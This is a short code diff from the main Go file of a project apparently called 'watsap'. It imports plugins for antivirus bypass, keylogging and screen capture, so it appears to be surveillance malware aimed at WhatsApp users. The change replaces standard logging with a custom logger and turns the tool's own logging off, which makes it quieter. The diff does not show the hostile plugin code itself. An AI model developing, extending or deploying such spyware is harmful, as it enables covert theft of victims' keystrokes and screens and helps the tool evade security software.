@@ -1,20 +1,20 @@
 package main
 
 import (
-	"log"
 	"sync"
 	"watsap/plugins/avbypass"
 	"watsap/plugins/keylog"
 	"watsap/plugins/screen"
 	"watsap/utils"
 	"watsap/utils/config"
+	"watsap/utils/logger"
 	"watsap/utils/messages"
 	"watsap/utils/wainit"
 )
 
 func init() {
 	config.DebugMode = false
-	config.WaLogging = true
+	config.WaLogging = false
 }
 
 func runSafe(wg *sync.WaitGroup, name string, fn func()) {
@@ -23,7 +23,7 @@ func runSafe(wg *sync.WaitGroup, name string, fn func()) {
 		defer wg.Done()
 		defer func() {
 			if r := recover(); r != nil {
-				log.Printf("[%s] Recovered from panic: %v", name, r)
+				logger.Error("Main", "Recovered panic in %s: %v", name, r)
 			}
 		}()
 		fn()
